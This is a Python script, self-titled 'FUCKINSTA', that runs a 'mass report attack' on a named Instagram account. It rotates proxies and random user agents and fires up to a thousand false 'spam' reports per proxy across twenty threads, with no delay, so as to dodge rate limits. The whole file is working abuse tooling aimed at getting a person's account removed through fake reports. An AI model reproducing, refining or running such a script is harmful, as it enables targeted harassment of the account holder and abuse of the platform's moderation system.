import requests
import random
import time
import threading
import json
import os
from datetime import datetime
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

# Configuration
TARGET_USERNAME = "gym_gh0stz"  # Replace with target Instagram username
REPORT_REASON = "spam"  # Options: spam, violence, nudity, harassment, etc.
REPORT_COUNT_PER_PROXY = 1000  # Number of reports per proxy
DELAY_BETWEEN_REPORTS = 0  # Seconds delay between reports to avoid rate limits
PROXY_LIST_FILE = "../proxies/proxies.txt"  # Path to proxy list file
LOG_FILE = "../logs/report_logs.txt"  # Path to log file

# Instagram unofficial report endpoint (subject to change)
INSTAGRAM_REPORT_URL = "https://www.instagram.com/users/{}/report/"

# Initialize user agent generator
ua = UserAgent()


# Function to log messages with timestamp
def log_message(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    with open(LOG_FILE, 'a') as f:
        f.write(log_entry)
    print(log_entry.strip())


# Load proxies from file
def load_proxies():
    try:
        with open(PROXY_LIST_FILE, 'r') as file:
            proxies = file.readlines()
        proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
        log_message(f"Loaded {len(proxies)} proxies from {PROXY_LIST_FILE}")
        return proxies
    except Exception as e:
        log_message(f"Error loading proxies: {str(e)}")
        return []


# Function to send a single report using a specific proxy
def send_report(proxy, user_id, attempt_num):
    try:
        proxy_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
        headers = {
            "User-Agent": ua.random,
            "Referer": f"https://www.instagram.com/{TARGET_USERNAME}/",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        data = {
            "reason": REPORT_REASON,
            "source_name": "profile"
        }
        response = requests.post(
            INSTAGRAM_REPORT_URL.format(user_id),
            headers=headers,
            proxies=proxy_dict,
            json=data,
            timeout=8
        )
        if response.status_code == 200:
            log_message(f"Report {attempt_num} sent successfully using proxy {proxy}")
            return True
        else:
            log_message(f"Report {attempt_num} failed with proxy {proxy}. Status: {response.status_code}")
            return False
    except Exception as e:
        log_message(f"Report {attempt_num} error with proxy {proxy}: {str(e)}")
        return False


# Main function to orchestrate mass reporting
def mass_report():
    proxies = load_proxies()
    if not proxies:
        log_message("No proxies found. Please add proxies to proxies.txt")
        return

    log_message(f"Starting mass report attack on {TARGET_USERNAME} with {len(proxies)} proxies...")

    # Placeholder user_id (replace with actual user_id for better results)
    user_id = "123456789"  # You need to find the real user_id for the target

    total_reports = len(proxies) * REPORT_COUNT_PER_PROXY
    log_message(f"Total planned reports: {total_reports}")

    success_count = 0
    attempt_count = 0

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for proxy in proxies:
            for i in range(REPORT_COUNT_PER_PROXY):
                attempt_count += 1
                futures.append(executor.submit(send_report, proxy, user_id, attempt_count))
                time.sleep(DELAY_BETWEEN_REPORTS)

        for future in futures:
            if future.result():
                success_count += 1

    log_message(f"Attack completed. Sent {success_count}/{total_reports} reports to {TARGET_USERNAME}")


if __name__ == "__main__":
    # Ensure log directory exists
    os.makedirs("../logs", exist_ok=True)
    log_message("Initiating FUCKINSTA...")
    mass_report()
    log_message("FUCKINSTA execution finished.")
